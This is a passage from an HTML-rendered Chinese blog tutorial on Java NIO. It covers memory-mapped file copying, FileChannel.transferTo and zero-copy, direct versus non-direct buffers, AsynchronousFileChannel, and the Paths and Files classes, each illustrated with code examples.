class="line">        <span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> sourceMappedBuffer.get(i);</span><br><span class="line">        destinationMappedBuffer.put(i, b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MappedByteBuffer 是 Java NIO 中的一个类，它继承自 java.nio.ByteBuffer。MappedByteBuffer 用于表示一个内存映射文件，即将文件的一部分或全部映射到内存中，以便通过直接操作内存来实现对文件的读写。这种方式可以提高文件 I&#x2F;O 的性能，因为操作系统可以直接在内存和磁盘之间传输数据，无需通过 Java 应用程序进行额外的数据拷贝。</p></li></ol><p>通常与 FileChannel 一起使用，可以通过调用 FileChannel 的 map() 方法创建 MappedByteBuffer 对象。map() 方法接受三个参数：映射模式（FileChannel.MapMode）映射起始位置和映射的长度。<br>映射模式包括只读模式（READ_ONLY）、读写模式（READ_WRITE）和专用模式（PRIVATE）。<br>我们设置源文件的 MappedByteBuffer 为只读模式（READ_ONLY），目标文件的 MappedByteBuffer 为读写模式（READ_WRITE）。<br>在循环中，我们逐字节地从源文件的 MappedByteBuffer 读取数据并将其写入目标文件的 MappedByteBuffer。这样就实现了文件复制功能。利用内存映射文件（MappedByteBuffer）实现的文件复制，可能会比使用 ByteBuffer 的方法更快。<br>需要注意的是，使用 MappedByteBuffer 进行文件操作时，数据的修改可能不会立即写入磁盘。可以通过调用 MappedByteBuffer 的 force() 方法将数据立即写回磁盘。</p><ol start="3"><li>通道之间通过transfer()实现数据的传输(直接操作缓冲区)：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> (<span class="type">FileChannel</span> <span class="variable">sourceChannel</span> <span class="operator">=</span> FileChannel.open(Paths.get(<span class="string">&quot;logs/javabetter/itwanger.txt&quot;</span>), StandardOpenOption.READ);</span><br><span class="line">      <span class="type">FileChannel</span> <span class="variable">destinationChannel</span> <span class="operator">=</span> FileChannel.open(Paths.get(<span class="string">&quot;logs/javabetter/itwanger3.txt&quot;</span>), StandardOpenOption.WRITE, StandardOpenOption.CREATE, StandardOpenOption.READ)) &#123;</span><br><span class="line">    sourceChannel.transferTo(<span class="number">0</span>, sourceChannel.size(), destinationChannel);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">&#125;</span><br><span class="line">``</span><br><span class="line">FileChannel 的 transferTo() 方法是一个高效的文件传输方法，它允许将文件的一部分或全部内容直接从源文件通道传输到目标通道（通常是另一个文件通道或网络通道）。这种传输方式可以避免将文件数据在用户空间和内核空间之间进行多次拷贝，提高了文件传输的性能。</span><br><span class="line">需要注意的是，transferTo() 方法可能无法一次传输所有请求的字节。在实际应用中，你可能需要使用循环来确保所有字节都被传输。</span><br><span class="line">```java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileChannelTransferToLoopExampleWithPaths</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Path</span> <span class="variable">sourcePath</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;logs/itwanger/paicoding.txt&quot;</span>);</span><br><span class="line">        <span class="type">Path</span> <span class="variable">destinationPath</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;logs/itwanger/paicoding_copy.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用 try-with-resources 语句确保通道资源被正确关闭</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileChannel</span> <span class="variable">sourceChannel</span> <span class="operator">=</span> FileChannel.open(sourcePath, StandardOpenOption.READ);</span><br><span class="line">             <span class="type">FileChannel</span> <span class="variable">destinationChannel</span> <span class="operator">=</span> FileChannel.open(destinationPath, StandardOpenOption.CREATE, StandardOpenOption.WRITE)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">long</span> <span class="variable">position</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">count</span> <span class="operator">=</span> sourceChannel.size();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 循环传输，直到所有字节都被传输</span></span><br><span class="line">            <span class="keyword">while</span> (position &lt; count) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">transferred</span> <span class="operator">=</span> sourceChannel.transferTo(position, count - position, destinationChannel);</span><br><span class="line">                position += transferred;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>此外，transferTo() 方法在底层使用了操作系统提供的零拷贝功能（如 Linux 的 sendfile() 系统调用），可以大幅提高文件传输性能。但是，不同操作系统和 JVM 实现可能会影响零拷贝的可用性和性能，因此实际性能可能因环境而异。<br>零拷贝（Zero-Copy）是一种优化数据传输性能的技术，它最大限度地减少了在数据传输过程中的 CPU 和内存开销。在传统的数据传输过程中，数据通常需要在用户空间和内核空间之间进行多次拷贝，这会导致额外的 CPU 和内存开销。零拷贝技术通过避免这些多余的拷贝操作，实现了更高效的数据传输。<br>在 Java 中，零拷贝技术主要应用于文件和网络 I&#x2F;O。FileChannel 类的 transferTo() 和 transferFrom() 方法就利用了零拷贝技术，可以在文件和网络通道之间高效地传输数据。<a href="https://zhuanlan.zhihu.com/p/83398714">https://zhuanlan.zhihu.com/p/83398714</a></li></ol><h4 id="直接与非直接缓冲区"><a href="#直接与非直接缓冲区" class="headerlink" title="直接与非直接缓冲区"></a>直接与非直接缓冲区</h4><p>直接缓冲区和非直接缓冲区的差别主要在于它们在内存中的存储方式。这里给出了直接缓冲区和非直接缓冲区的简要概述和区别：<br>非直接缓冲区：</p><ul><li>分配在 JVM 堆内存中</li><li>受到垃圾回收的管理</li><li>在读写操作时，需要将数据从堆内存复制到操作系统的本地内存，再进行 I&#x2F;O 操作</li><li>创建： ByteBuffer.allocate(int capacity)<br>直接缓冲区：</li><li>分配在操作系统的本地内存中</li><li>不受垃圾回收的管理</li><li>在读写操作时，直接在本地内存中进行，避免了数据复制，提高了性能</li><li>创建： ByteBuffer.allocateDirect(int capacity)</li><li>还有前面提到的 FileChannel.map() 方法，会返回一个类型为 MappedByteBuffer 的直接缓冲区。<br><img src="/2024/11/04/code/javanio/image-7.png"><br>非直接缓冲区存储在JVM内部，数据需要从应用程序（Java）复制到非直接缓冲区，再复制到内核缓冲区，最后发送到设备（磁盘&#x2F;网络）。而对于直接缓冲区，数据可以直接从应用程序（Java）复制到内核缓冲区，无需经过JVM的非直接缓冲区。</li></ul><h4 id="异步文件通道-AsynchronousFileChannel"><a href="#异步文件通道-AsynchronousFileChannel" class="headerlink" title="异步文件通道 AsynchronousFileChannel"></a>异步文件通道 AsynchronousFileChannel</h4><p>AsynchronousFileChannel 是 Java 7 引入的一个异步文件通道类，提供了对文件的异步读、写、打开和关闭等操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">file</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;example.txt&quot;</span>);</span><br><span class="line"><span class="type">AsynchronousFileChannel</span> <span class="variable">fileChannel</span> <span class="operator">=</span> AsynchronousFileChannel.open(file, StandardOpenOption.READ, StandardOpenOption.WRITE);</span><br></pre></td></tr></table></figure><p>AsynchronousFileChannel 提供了两种异步操作的方式：</p><ol><li><p>Future 方式：使用 Future 对象来跟踪异步操作的完成情况。当我们调用一个异步操作（如 read() 或 write()）时，它会立即返回一个 Future 对象。可以使用这个对象来检查操作是否完成，以及获取操作的结果。这种方式适用于不需要在操作完成时立即执行其他操作的场景。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"><span class="type">long</span> <span class="variable">position</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">Future&lt;Integer&gt; result = fileChannel.read(buffer, position);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (!result.isDone()) &#123;</span><br><span class="line">    <span class="comment">// 执行其他操作</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> result.get();</span><br><span class="line">System.out.println(<span class="string">&quot;Bytes read: &quot;</span> + bytesRead);</span><br></pre></td></tr></table></figure></li><li><p>CompletionHandler 方式，使用一个实现了 CompletionHandler 接口的对象来处理异步操作的完成。我们需要提供一个 CompletionHandler 实现类，重写 completed() 和 failed() 方法，分别处理操作成功和操作失败的情况。当异步操作完成时，系统会自动调用相应的方法。这种方式适用于需要在操作完成时立即执行其他操作的场景。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"><span class="type">long</span> <span class="variable">position</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fileChannel.read(buffer, position, buffer, <span class="keyword">new</span> <span class="title class_">CompletionHandler</span>&lt;Integer, ByteBuffer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(Integer result, ByteBuffer attachment)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Bytes read: &quot;</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(Throwable exc, ByteBuffer attachment)</span> &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;Read failed&quot;</span>);</span><br><span class="line">        exc.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>完整的示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;docs/配套教程.md&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> (<span class="type">AsynchronousFileChannel</span> <span class="variable">fileChannel</span> <span class="operator">=</span> AsynchronousFileChannel.open(path, StandardOpenOption.READ)) &#123;</span><br><span class="line">    <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line">    <span class="type">long</span> <span class="variable">position</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        Future&lt;Integer&gt; result = fileChannel.read(buffer, position);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!result.isDone()) &#123;</span><br><span class="line">            <span class="comment">// 在这里可以执行其他任务，例如处理其他 I/O 操作</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> result.get();</span><br><span class="line">        <span class="keyword">if</span> (bytesRead &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        position += bytesRead;</span><br><span class="line">        buffer.flip();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] data = <span class="keyword">new</span> <span class="title class_">byte</span>[buffer.limit()];</span><br><span class="line">        buffer.get(data);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(data));</span><br><span class="line"></span><br><span class="line">        buffer.clear();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个示例中，我们使用 AsynchronousFileChannel.read() 方法发起异步读取操作。这个方法会返回一个 Future<Integer> 对象，表示读取操作的结果。我们可以通过调用 isDone() 方法来检查异步操作是否完成。完成后，我们可以通过调用 get() 方法获取实际读取的字节数。<br>然后我们来看 CompletionHandler 接口的形式：</Integer></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">readAllBytes</span><span class="params">(Path path)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">    <span class="type">AsynchronousFileChannel</span> <span class="variable">fileChannel</span> <span class="operator">=</span> AsynchronousFileChannel.open(path, StandardOpenOption.READ);</span><br><span class="line">    <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line">    <span class="type">AtomicLong</span> <span class="variable">position</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicLong</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="type">CountDownLatch</span> <span class="variable">latch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CountDownLatch</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    fileChannel.read(buffer, position.get(), <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">CompletionHandler</span>&lt;Integer, Object&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(Integer bytesRead, Object attachment)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (bytesRead &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                position.addAndGet(bytesRead);</span><br><span class="line">                buffer.flip();</span><br><span class="line">                <span class="type">byte</span>[] data = <span class="keyword">new</span> <span class="title class_">byte</span>[buffer.limit()];</span><br><span class="line">                buffer.get(data);</span><br><span class="line">                System.out.print(<span class="keyword">new</span> <span class="title class_">String</span>(data));</span><br><span class="line">                buffer.clear();</span><br><span class="line"></span><br><span class="line">                fileChannel.read(buffer, position.get(), attachment, <span class="built_in">this</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                latch.countDown();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fileChannel.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(Throwable exc, Object attachment)</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Error: &quot;</span> + exc.getMessage());</span><br><span class="line">            latch.countDown();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    latch.await();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="Java-NIO-中的Paths-和-Files"><a href="#Java-NIO-中的Paths-和-Files" class="headerlink" title="Java NIO 中的Paths 和 Files"></a>Java NIO 中的Paths 和 Files</h2><p>Java NIO（New I&#x2F;O）库引入了许多新的功能，其中包括 <code>Paths</code> 和 <code>Files</code> 这两个重要的类，它们主要用于文件和目录的操作，提供了比传统的 <code>File</code> 类更强大和灵活的功能。</p><h3 id="1-Paths-类"><a href="#1-Paths-类" class="headerlink" title="1. Paths 类"></a>1. <code>Paths</code> 类</h3><p><code>Paths</code> 类用于定位文件系统中的路径，是 <code>java.nio.file.Path</code> 的便捷工厂类。<code>Paths</code> 类的静态方法可以将字符串路径转换为 <code>Path</code> 实例，便于进行进一步的操作。</p><ul><li><p><strong>创建 Path 对象</strong><br>使用 <code>Paths.get(String first, String... more)</code> 方法可以轻松创建一个 <code>Path</code> 实例。该方法接受一个字符串或多个字符串参数（代表路径的各个部分）并返回 <code>Path</code> 对象。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;file.txt&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p><strong>获取路径信息</strong><br><code>Path</code> 类提供了丰富的路径信息查询方法，如：</p><ul><li><code>getFileName()</code>: 获取文件名。</li><li><code>getParent()</code>: 获取上级目录路径。</li><li><code>getRoot()</code>: 获取根路径。</li><li><code>isAbsolute()</code>: 检查路径是否为绝对路径。</li><li><code>toAbsolutePath()</code>: 转换为绝对路径。</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;docs/配套教程.md&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取文件名</span></span><br><span class="line">System.out.println(<span class="string">&quot;File name: &quot;</span> + path.getFileName());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取父目录</span></span><br><span class="line">System.out.println(<span class="string">&quot;Parent: &quot;</span> + path.getParent());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取根目录</span></span><br><span class="line">System.out.println(<span class="string">&quot;Root: &quot;</span> + path.getRoot());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将路径与另一个路径结合</span></span><br><span class="line"><span class="type">Path</span> <span class="variable">newPath</span> <span class="operator">=</span> path.resolve(<span class="string">&quot;config/app.properties&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;Resolved path: &quot;</span> + newPath);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 简化路径</span></span><br><span class="line"><span class="type">Path</span> <span class="variable">normalizedPath</span> <span class="operator">=</span> newPath.normalize();</span><br><span class="line">System.out.println(<span class="string">&quot;Normalized path: &quot;</span> + normalizedPath);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将相对路径转换为绝对路径</span></span><br><span class="line"><span class="type">Path</span> <span class="variable">absolutePath</span> <span class="operator">=</span> path.toAbsolutePath();</span><br><span class="line">System.out.println(<span class="string">&quot;Absolute path: &quot;</span> + absolutePath);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算两个路径之间的相对路径</span></span><br><span class="line"><span class="type">Path</span> <span class="variable">basePath</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;/docs/&quot;</span>);</span><br><span class="line"><span class="type">Path</span> <span class="variable">targetPath</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;/docs/imgs/itwanger&quot;</span>);</span><br><span class="line"><span class="type">Path</span> <span class="variable">relativePath</span> <span class="operator">=</span> basePath.relativize(targetPath);</span><br><span class="line">System.out.println(<span class="string">&quot;Relative path: &quot;</span> + relativePath);</span><br></pre></td></tr></table></figure><h4 id="2-Files-类"><a href="#2-Files-类" class="headerlink" title="2. Files 类"></a>2. <code>Files</code> 类</h4><p><code>Files</code> 类包含大量静态方法，用于操作文件和目录。<code>Files</code> 提供了对文件创建、删除、读取、写入等功能的支持，非常适合进行文件 I&#x2F;O 操作。</p><p>以下是 <code>Files</code> 类中一些常用的方法：</p><ul><li><p><strong>文件和目录的创建和删除</strong>  </p><ul><li><code>createFile(Path path)</code>: 创建一个新文件，如果文件已经存在则会抛出异常。</li><li><code>createDirectory(Path path)</code>: 创建一个新目录。</li><li><code>delete(Path path)</code>: 删除文件或目录。</li><li><code>deleteIfExists(Path path)</code>: 如果文件存在则删除，避免异常抛出。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个Path实例</span></span><br><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;logs/javabetter/itwanger4.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个新文件</span></span><br><span class="line">Files.createFile(path);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查文件是否存在</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">exists</span> <span class="operator">=</span> Files.exists(path);</span><br><span class="line">System.out.println(<span class="string">&quot;File exists: &quot;</span> + exists);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除文件</span></span><br><span class="line">Files.delete(path);</span><br></pre></td></tr></table></figure></li><li><p><strong>文件读写</strong>  </p><ul><li><code>readAllBytes(Path path)</code>: 读取文件内容并以字节数组的形式返回。</li><li><code>readAllLines(Path path)</code>: 读取文件内容并将每行作为列表中的一个元素返回。</li><li><code>write(Path path, byte[] bytes)</code>: 将字节数组写入文件。</li><li><code>write(Path path, Iterable&lt;? extends CharSequence&gt; lines)</code>: 将多行文本写入文件。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;file.txt&quot;</span>);</span><br><span class="line">List&lt;String&gt; lines = Files.readAllLines(path);</span><br></pre></td></tr></table></figure></li><li><p><strong>文件属性检查</strong>  </p><ul><li><code>exists(Path path)</code>: 检查文件或目录是否存在。</li><li><code>isDirectory(Path path)</code>: 检查是否为目录。</li><li><code>isReadable(Path path)</code>: 检查文件是否可读。</li><li><code>isWritable(Path path)</code>: 检查文件是否可写。</li></ul></li><li><p><strong>文件复制和移动</strong>  </p><ul><li><code>copy(Path source, Path target, CopyOption... options)</code>: 复制文件。</li><li><code>move(Path source, Path target, CopyOption... options)</code>: 移动或重命名文件。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">source</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;file.txt&quot;</span>);</span><br><span class="line"><span class="type">Path</span> <span class="variable">target</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;copyOfFile.txt&quot;</span>);</span><br><span class="line">Files.copy(source, target);</span><br></pre></td></tr></table></figure></li></ul><p><code>java.nio.file.Files</code>类提供了大量静态方法，用于处理文件系统中的文件和目录。这些方法包括文件的创建、删除、复制、移动等操作，以及读取和设置文件属性。</p><p>下面展示一个 Files 和 Paths 一起使用的示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个Path实例</span></span><br><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;logs/javabetter/itwanger4.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个新文件</span></span><br><span class="line">Files.createFile(path);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查文件是否存在</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">exists</span> <span class="operator">=</span> Files.exists(path);</span><br><span class="line">System.out.println(<span class="string">&quot;File exists: &quot;</span> + exists);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除文件</span></span><br><span class="line">Files.delete(path);</span><br></pre></td></tr></table></figure><p>以下是一些常用方法及其示例：</p><p>1、<code>exists(Path path, LinkOption... options)</code>：检查文件或目录是否存在。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;file.txt&quot;</span>);</span><br><span class="line"><span class="type">boolean</span> <span class="variable">exists</span> <span class="operator">=</span> Files.exists(path);</span><br><span class="line">System.out.println(<span class="string">&quot;File exists: &quot;</span> + exists);</span><br></pre></td></tr></table></figure><p>LinkOption 是一个枚举类，它定义了如何处理文件系统链接的选项。它位于 java.nio.file 包中。LinkOption 主要在与文件或目录的路径操作相关的方法中使用，以控制这些方法如何处理符号链接。符号链接是一种特殊类型的文件，它在 Unix 和类 Unix 系统（如 Linux 和 macOS）上很常见。在 Windows 上，类似的概念被称为快捷方式。</p><p>2、<code>createFile(Path path, FileAttribute&lt;?&gt;... attrs)</code>：创建一个新的空文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">newPath</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;newFile.txt&quot;</span>);</span><br><span class="line">Files.createFile(newPath);</span><br></pre></td></tr></table></figure><p>FileAttribute 是一个泛型接口，用于处理各种不同类型的属性。在使用 FileAttribute 时，你需要为其提供一个特定的实现。<code>java.nio.file.attribute</code> 包中的 PosixFileAttributes 类提供了 POSIX（Portable Operating System Interface，定义了许多与文件系统相关的操作，包括文件和目录的创建、删除、读取和修改。）文件属性的实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span 